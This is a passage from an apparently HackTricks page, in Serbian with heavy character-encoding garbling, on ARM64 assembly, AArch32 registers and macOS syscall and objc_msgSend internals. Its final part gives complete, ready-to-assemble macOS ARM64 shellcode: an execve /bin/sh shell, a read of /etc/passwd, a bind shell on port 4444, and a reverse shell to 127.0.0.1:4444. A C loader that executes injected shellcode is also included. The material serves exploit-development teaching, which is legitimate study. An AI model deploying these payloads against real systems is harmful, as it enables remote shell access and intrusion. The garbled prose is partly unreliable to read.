* –ü—Ä–∏–º–µ—Ä: `stur x0, [x1, #4]` ‚Äî –û–≤–æ —á—É–≤–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç —É `x0` —É –º–µ–º–æ—Ä–∏—ò—Å–∫–æ—ò –∞–¥—Ä–µ—Å–∏ –∫–æ—ò–∞ —ò–µ 4 –±–∞—ò—Ç–∞ –≤–µ—õ–∞ –æ–¥ –∞–¥—Ä–µ—Å–µ –∫–æ—ò–∞ —Å–µ —Ç—Ä–µ–Ω—É—Ç–Ω–æ –Ω–∞–ª–∞–∑–∏ —É `x1`.
* **`svc`** : –ò–∑–≤—Ä—à–∏—Ç–µ **—Å–∏—Å—Ç–µ–º—Å–∫–∏ –ø–æ–∑–∏–≤**. –û–≤–æ –∑–Ω–∞—á–∏ "–ü–æ–∑–∏–≤ —Å—É–ø–µ—Ä–≤–∏–∑–æ—Ä–∞". –ö–∞–¥–∞ –ø—Ä–æ—Ü–µ—Å–æ—Ä –∏–∑–≤—Ä—à–∞–≤–∞ –æ–≤—É –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò—É, **–ø—Ä–µ–ª–∞–∑–∏ –∏–∑ –∫–æ—Ä–∏—Å–Ω–∏—á–∫–æ–≥ —Ä–µ–∂–∏–º–∞ —É —Ä–µ–∂–∏–º —ò–µ–∑–≥—Ä–∞** –∏ —Å–∫–æ—á–∏ –Ω–∞ –æ–¥—Ä–µ—í–µ–Ω—É –ª–æ–∫–∞—Ü–∏—ò—É —É –º–µ–º–æ—Ä–∏—ò–∏ –≥–¥–µ —Å–µ –Ω–∞–ª–∞–∑–∏ **–∫–æ–¥ –∑–∞ –æ–±—Ä–∞–¥—É —Å–∏—Å—Ç–µ–º—Å–∫–∏—Ö –ø–æ–∑–∏–≤–∞ —ò–µ–∑–≥—Ä–∞**.
*   –ü—Ä–∏–º–µ—Ä:

```armasm
mov x8, 93  ; –£—á–∏—Ç–∞—ò—Ç–µ –±—Ä–æ—ò —Å–∏—Å—Ç–µ–º—Å–∫–æ–≥ –ø–æ–∑–∏–≤–∞ –∑–∞ –∏–∑–ª–∞–∑ (93) —É —Ä–µ–≥–∏—Å—Ç–∞—Ä x8.
mov x0, 0   ; –£—á–∏—Ç–∞—ò—Ç–µ –∫–æ–¥ —Å—Ç–∞—Ç—É—Å–∞ –∏–∑–ª–∞–∑–∞ (0) —É —Ä–µ–≥–∏—Å—Ç–∞—Ä x0.
svc 0       ; –ò–∑–≤—Ä—à–∏—Ç–µ —Å–∏—Å—Ç–µ–º—Å–∫–∏ –ø–æ–∑–∏–≤.
```

### **–ü—Ä–æ–ª–æ–≥ —Ñ—É–Ω–∫—Ü–∏—ò–µ**

1. **–°–∞—á—É–≤–∞—ò—Ç–µ —Ä–µ–≥–∏—Å—Ç–∞—Ä –∑–∞ –ø–æ–≤—Ä–∞—Ç–∞–∫ –∏ –ø–æ–∫–∞–∑–∏–≤–∞—á –æ–∫–≤–∏—Ä–∞ –Ω–∞ —Å—Ç–µ–∫—É**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Postavite novi pokazivaƒç okvira**: `mov x29, sp` (postavlja novi pokazivaƒç okvira za trenutnu funkciju)
3. **Dodelite prostor na steku za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj bajtova koji su potrebni)

### **Epilog funkcije**

1. **Dealokacija lokalnih promenljivih (ako su dodeljene)**: `add sp, sp, <size>`
2. **Obnovite registrator veze i pokazivaƒç okvira**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Povratak**: `ret` (vraƒáa kontrolu pozivaocu koristeƒái adresu u link registru)

## AARCH32 Izvr≈°ni Stanje

Armv8-A podr≈æava izvr≈°avanje 32-bitnih programa. **AArch32** mo≈æe raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`** i mo≈æe prebacivati izmeƒëu njih putem **`interworking`**.\
**Privilegovani** 64-bitni programi mogu zakazati **izvr≈°avanje 32-bitnih** programa izvr≈°avanjem prenosa nivoa izuzetka na ni≈æe privilegovane 32-bitne.\
Napomena: prelazak sa 64-bitnog na 32-bitni se de≈°ava sa smanjenjem nivoa izuzetka (na primer, 64-bitni program u EL1 pokreƒáe program u EL0). Ovo se posti≈æe postavljanjem **bita 4** **`SPSR_ELx`** specijalnog registra **na 1** kada je `AArch32` procesna nit spremna za izvr≈°avanje, a ostatak `SPSR_ELx` ƒçuva **`AArch32`** programe CPSR. Zatim, privilegovani proces poziva **`ERET`** instrukciju tako da procesor prelazi na **`AArch32`** ulazeƒái u A32 ili T32 u zavisnosti od CPSR\*\*.\*\*

**`Interworking`** se de≈°ava kori≈°ƒáenjem J i T bitova CPSR. `J=0` i `T=0` znaƒçi **`A32`** i `J=0` i `T=1` znaƒçi **T32**. Ovo se su≈°tinski prevodi na postavljanje **najni≈æeg bita na 1** da oznaƒçi da je skup instrukcija T32.\
Ovo se postavlja tokom **interworking grana instrukcija,** ali se takoƒëe mo≈æe postaviti direktno sa drugim instrukcijama kada je PC postavljen kao registar odredi≈°ta. Primer:

Jo≈° jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoji 16 32-bitnih registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, meƒëutim neki od njih su obiƒçno rezervisani:

* **`r15`**: Program counter (uvek). Sadr≈æi adresu sledeƒáe instrukcije. U A32 trenutni + 8, u T32, trenutni + 4.
* **`r11`**: Frame Pointer
* **`r12`**: Intra-procedural call register
* **`r13`**: Stack Pointer
* **`r14`**: Link Register

Pored toga, registri su podr≈æani u **`banked registries`**. To su mesta koja ƒçuvaju vrednosti registara, omoguƒáavajuƒái **brzo prebacivanje konteksta** u obradi izuzetaka i privilegovanih operacija kako bi se izbegla potreba za ruƒçnim ƒçuvanjem i vraƒáanjem registara svaki put.\
To se posti≈æe **ƒçuvanjem stanja procesora iz `CPSR` u `SPSR`** re≈æima procesora u kojem se izuzetak de≈°ava. Kada se izuzetak vrati, **`CPSR`** se vraƒáa iz **`SPSR`**.

### CPSR - Registro trenutnog statusa programa

U AArch32 CPSR funkcioni≈°e sliƒçno **`PSTATE`** u AArch64 i takoƒëe se ƒçuva u **`SPSR_ELx`** kada se izuzetak de≈°ava kako bi se kasnije obnovila izvr≈°enja:

<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

* Registro statusa aplikacionog programa (APSR): Aritmetiƒçke zastavice i dostupne iz EL0
* Registrovi stanja izvr≈°enja: Pona≈°anje procesa (u upravljanju od strane OS-a).

#### Registro statusa aplikacionog programa (APSR)

* Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (poput AArch64)
* Zastavica **`Q`**: Postavlja se na 1 kada god **doƒëe do saturacije celih brojeva** tokom izvr≈°enja specijalizovane aritmetiƒçke instrukcije sa saturacijom. Kada se postavi na **`1`**, zadr≈æaƒáe tu vrednost dok se ruƒçno ne postavi na 0. Pored toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, to se mora uraditi ƒçitanjem ruƒçno.
* **`GE`** (Veƒáe ili jednako) Zastavice: Koriste se u SIMD (Jedna instrukcija, vi≈°e podataka) operacijama, kao ≈°to su "paralelno sabiranje" i "paralelno oduzimanje". Ove operacije omoguƒáavaju obradu vi≈°e taƒçaka podataka u jednoj instrukciji.

Na primer, instrukcija **`UADD8`** **sabira ƒçetiri para bajtova** (iz dva 32-bitna operanda) paralelno i ƒçuva rezultate u 32-bitnom registru. Zatim **postavlja `GE` zastavice u `APSR`** na osnovu ovih rezultata. Svaka GE zastavica odgovara jednom od sabiranja bajtova, ukazujuƒái da li je sabiranje za taj par bajtova **prelilo**.

Instrukcija **`SEL`** koristi ove GE zastavice za izvr≈°avanje uslovnih akcija.

#### Registrovi stanja izvr≈°enja

* Zastavice **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se skup instrukcija A32, a ako je 1, koristi se T32.
* **IT Block State Register** (`ITSTATE`): Ovo su bitovi od 10-15 i 25-26. ƒåuvaju uslove za instrukcije unutar grupe sa prefiksom **`IT`**.
* **`E`** bit: Ukazuje na **endianness**.
* **Bitovi re≈æima i maske izuzetaka** (0-4): Odreƒëuju trenutno stanje izvr≈°enja. **5.** oznaƒçava da li program radi kao 32bit (1) ili 64bit (0). Ostala 4 predstavljaju **re≈æim izuzetka koji se trenutno koristi** (kada se izuzetak de≈°ava i obraƒëuje). Broj postavljen **ukazuje na trenutni prioritet** u sluƒçaju da se drugi izuzetak pokrene dok se ovaj obraƒëuje.

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: Odreƒëeni izuzeci mogu biti onemoguƒáeni kori≈°ƒáenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znaƒçi da ƒáe **asinkroni aborti** biti pokrenuti. **`I`** konfiguri≈°e odgovor na spoljne hardverske **Interrupts Requests** (IRQs). a F se odnosi na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD syscalls ƒáe imati **x16 > 0**.

### Mach Traps

Pogledajte u [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) `mach_trap_table` i u [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) prototipove. Maksimalni broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps ƒáe imati **x16 < 0**, tako da treba da pozovete brojeve iz prethodne liste sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takoƒëe mo≈æete proveriti **`libsystem_kernel.dylib`** u disassembleru da biste saznali kako da pozovete ove (i BSD) syscalls:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

Napomena da **Ida** i **Ghidra** takoƒëe mogu dekompilirati **specifiƒçne dylibs** iz ke≈°a jednostavno prolazeƒái kroz ke≈°.

{% hint style="success" %}
Ponekad je lak≈°e proveriti **dekompilirani** kod iz **`libsystem_kernel.dylib`** **nego** proveravati **izvorni kod** jer se kod nekoliko syscalls (BSD i Mach) generi≈°e putem skripti (proverite komentare u izvoru) dok u dylib-u mo≈æete pronaƒái ≈°ta se poziva.
{% endhint %}

### machdep pozivi

XNU podr≈æava jo≈° jedan tip poziva koji se naziva zavistan od ma≈°ine. Broj ovih poziva zavisi od arhitekture i ni pozivi ni brojevi nisu garantovani da ostanu konstantni.

### comm stranica

Ovo je stranica memorije koju poseduje kernel i koja je mapirana u adresni prostor svakog korisniƒçkog procesa. Namenjena je da ubrza prelazak iz korisniƒçkog moda u kernel prostor br≈æe nego kori≈°ƒáenje syscalls za kernel usluge koje se toliko koriste da bi ovaj prelazak bio veoma neefikasan.

Na primer, poziv `gettimeofdate` ƒçita vrednost `timeval` direktno sa comm stranice.

### objc\_msgSend

Veoma je uobiƒçajeno pronaƒái ovu funkciju kori≈°ƒáenu u Objective-C ili Swift programima. Ova funkcija omoguƒáava pozivanje metode objekta Objective-C.

Parametri ([vi≈°e informacija u dokumentaciji](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Pokazivaƒç na instancu
* x1: op -> Selektor metode
* x2... -> Ostatak argumenata pozvane metode

Dakle, ako stavite breakpoint pre grananja na ovu funkciju, lako mo≈æete pronaƒái ≈°ta se poziva u lldb sa (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji ƒáe izvr≈°iti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
Postavljanjem env varijable **`NSObjCMessageLoggingEnabled=1`** moguƒáe je logovati kada se ova funkcija poziva u datoteci kao ≈°to je `/tmp/msgSends-pid`.

Pored toga, postavljanjem **`OBJC_HELP=1`** i pozivanjem bilo kog binarnog fajla mo≈æete videti druge varijable okru≈æenja koje mo≈æete koristiti da **log** kada se odreƒëene Objc-C akcije de≈°avaju.
{% endhint %}

Kada se ova funkcija pozove, potrebno je pronaƒái pozvanu metodu oznaƒçene instance, za to se vr≈°e razliƒçite pretrage:

* Izvr≈°iti optimistiƒçku pretragu u ke≈°u:
* Ako je uspe≈°no, gotovo
* Zauzeti runtimeLock (ƒçitanje)
* Ako (realize && !cls->realized) realizovati klasu
* Ako (initialize && !cls->initialized) inicijalizovati klasu
* Poku≈°ati ke≈° klase:
* Ako je uspe≈°no, gotovo
* Poku≈°ati listu metoda klase:
* Ako je pronaƒëeno, popuniti ke≈° i gotovo
* Poku≈°ati ke≈° superklase:
* Ako je uspe≈°no, gotovo
* Poku≈°ati listu metoda superklase:
* Ako je pronaƒëeno, popuniti ke≈° i gotovo
* Ako (resolver) poku≈°ati metodu resolver, i ponoviti od pretrage klase
* Ako ste jo≈° ovde (= sve ostalo je propalo) poku≈°ati forwarder

### Shellcodes

Za kompajliranje:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da biste izvukli bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
–ó–∞ –Ω–æ–≤–∏—ò–µ macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i obja≈°njeno.

{% tabs %}
{% tab title="sa adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="sa stekom" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="sa adr za linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}
{% endtabs %}

#### ƒåitaj sa cat

Cilj je izvr≈°iti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (≈°to u memoriji znaƒçi stek adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozovite komandu sa sh iz fork-a tako da glavni proces ne bude ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **portu 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Sa [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈æite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
